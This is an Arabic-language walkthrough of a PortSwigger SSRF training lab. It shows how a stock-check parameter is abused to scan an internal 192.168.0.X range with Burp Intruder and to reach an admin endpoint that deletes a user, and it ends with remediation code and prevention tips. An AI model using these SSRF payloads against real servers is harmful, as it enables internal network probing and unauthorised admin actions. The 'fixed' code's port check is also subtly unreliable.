# Lab: Basic SSRF against another back-end system

> **Category:** SSRF  
> **Difficulty:** APPRENTICE  
> **Lab Link:** [PortSwigger Lab - Basic SSRF against another back-end system](https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-backend-system)

---

## 🎯 الهدف الرئيسي

استغلال ثغرة SSRF (Server-Side Request Forgery) في ميزة فحص المخزون (stock check). التطبيق يقوم بجلب بيانات من نظام داخلي باستخدام رابط يوفره المستخدم. سنقوم بمسح نطاق `192.168.0.X` للعثور على واجهة إدارة على المنفذ `8080`، ثم استخدامها لحذف المستخدم `carlos`.

---

## 📝 الحل خطوة بخطوة

### الخطوة 1: فهم ميزة فحص المخزون

- اذهب إلى أي منتج في المتجر
- اضغط على زر **Check stock**
- لاحظ أنه يتم إرسال طلب `POST` إلى `/product/stock`

### الخطوة 2: اعتراض الطلب في Burp

- في Burp → **Proxy > HTTP history**
- ابحث عن طلب `POST /product/stock`:

```http
POST /product/stock HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded

stockApi=http://192.168.0.1/stock
```

### الخطوة 3: إرسال الطلب إلى Intruder

- زر الماوس الأيمن → **Send to Intruder**

### الخطوة 4: تحديد موضع الهجوم (Payload position)

- غيّر معامل `stockApi` إلى:

```
http://192.168.0.1§§:8080/admin
```

أو ضع علامات `§` حول الرقم الأخير من عنوان IP:

```
http://192.168.0.§1§:8080/admin
```

### الخطوة 5: إعداد Payloads

- في **Payloads** tab:
  - **Payload type:** Numbers
  - **From:** `1`
  - **To:** `255`
  - **Step:** `1`

### الخطوة 6: بدء الهجوم

- اضغط **Start attack**

سيرسل Intruder 255 طلباً إلى `http://192.168.0.1:8080/admin` حتى `http://192.168.0.255:8080/admin`

### الخطوة 7: البحث عن الرد الناجح

- في نتائج Intruder، افرز الطلبات حسب **Status** (رمز الحالة)
- ابحث عن طلب برمز **200 OK**
- هذا الطلب يحتوي على واجهة الإدارة (admin panel)

### الخطوة 8: إرسال الطلب إلى Repeater

- حدد الطلب الناجح (رمز 200)
- زر الماوس الأيمن → **Send to Repeater**

### الخطوة 9: تحديد رابط حذف المستخدم

في رد الطلب، ستجد رابط حذف `carlos`:

```
http://192.168.0.X:8080/admin/delete?username=carlos
```

### الخطوة 10: تنفيذ طلب الحذف

- في Repeater، غيّر مسار `stockApi` إلى الرابط الكامل للحذف:

```http
POST /product/stock HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded

stockApi=http://192.168.0.X:8080/admin/delete?username=carlos
```

(استبدل `X` برقم IP الذي وجدته)

### الخطوة 11: إرسال الطلب

- اضغط **Send**

**النتيجة:** تم حذف المستخدم `carlos` ✅

### الخطوة 12: حل المختبر

بعد حذف `carlos`، سيتم حل المختبر تلقائياً ✅

---

## ملاحظات

| النقطة | الشرح |
|--------|-------|
| **ما هو الهدف من المسح؟** | العثور على عنوان IP الصحيح للنظام الداخلي الذي يستضيف واجهة الإدارة |
| **لماذا المنفذ 8080؟** | النظام الداخلي يعمل على منفذ مختلف عن المنفذ الافتراضي (80) |
| **كيف نجح المسح؟** | باستخدام Burp Intruder لفحص جميع العناوين في النطاق `192.168.0.1-255` |
| **لماذا 255 طلباً فقط؟** | النطاق `192.168.0.X` يحتوي على 256 عنواناً (0-255)، لكن العادة تبدأ من 1 |

---

## 🛡️ Remediation & Source Code Fix

### 📌 Vulnerability Root Cause

الخادم يثق في رابط يوفره المستخدم (`stockApi`) ويقوم بإرسال طلب HTTP إليه دون أي تحقق أو تصفية، مما يسمح بمسح الشبكة الداخلية.

---

### ❌ Non-Compliant Code (Next.js)

```javascript
// pages/api/stock.js
export default function handler(req, res) {
  const { stockApi } = req.body;
  
  // خطأ: إرسال طلب إلى أي عنوان يوفره المستخدم
  fetch(stockApi)
    .then(response => response.text())
    .then(data => res.send(data))
    .catch(err => res.status(500).send('Error'));
}
```

---

### ✅ Compliant Code (Next.js)

```javascript
// pages/api/stock.js
export default async function handler(req, res) {
  const { stockApi } = req.body;
  
  // التصحيح 1: التحقق من أن الرابط يبدأ بنطاق مسموح
  const allowedHosts = ['192.168.0.1']; // فقط عنوان واحد محدد
  const url = new URL(stockApi);
  
  if (!allowedHosts.includes(url.hostname)) {
    return res.status(400).json({ error: 'Invalid stock API URL' });
  }
  
  // التصحيح 2: منع الوصول إلى المسارات الحساسة
  const blockedPaths = ['/admin', '/delete'];
  if (blockedPaths.some(path => url.pathname.startsWith(path))) {
    return res.status(403).json({ error: 'Access denied' });
  }
  
  // التصحيح 3: التحقق من المنفذ المسموح
  const allowedPorts = [80, 443];
  const port = url.port || (url.protocol === 'https:' ? 443 : 80);
  if (!allowedPorts.includes(port)) {
    return res.status(400).json({ error: 'Invalid port' });
  }
  
  // التصحيح 4: استخدام قائمة بيضاء للمسارات
  const allowedPaths = ['/stock', '/inventory'];
  if (!allowedPaths.some(path => url.pathname === path)) {
    return res.status(403).json({ error: 'Access denied' });
  }
  
  // التصحيح 5: منع المسح الضوئي للنطاقات (rate limiting)
  // يمكن إضافة حد لعدد الطلبات من نفس IP
  
  const response = await fetch(stockApi);
  const data = await response.text();
  res.send(data);
}
```

**الخلاصة:** 
1. استخدم قائمة بيضاء (allowlist) للنطاقات المسموحة (وليس نطاقاً كاملاً)
2. امنع الوصول إلى المسارات الحساسة (`/admin`, `/delete`)
3. حدد المنافذ المسموحة (80, 443 فقط)
4. قم بتطبيق rate limiting لمنع المسح الضوئي

---

## 🛡️ كيفية الوقاية (How to Prevent)

| الإجراء | الوصف |
|---------|-------|
| **Allowlist للنطاقات** | حدد عناوين IP محددة مسموحة، وليس نطاقاً كاملاً |
| **منع العناوين الداخلية** | ارفض الوصول إلى النطاقات الخاصة (192.168.x.x, 10.x.x.x, 172.16.x.x) |
| **التحقق من المسار** | امنع الوصول إلى المسارات الحساسة |
| **التحقق من المنفذ** | سمح فقط بالمنافذ 80 و 443 |
| **Rate limiting** | حدد عدد الطلبات المسموحة لكل مستخدم/IP |

---

## 🔗 روابط مفيدة

- [PortSwigger Lab Page](https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-backend-system)
- [SSRF Cheat Sheet](https://portswigger.net/web-security/ssrf)
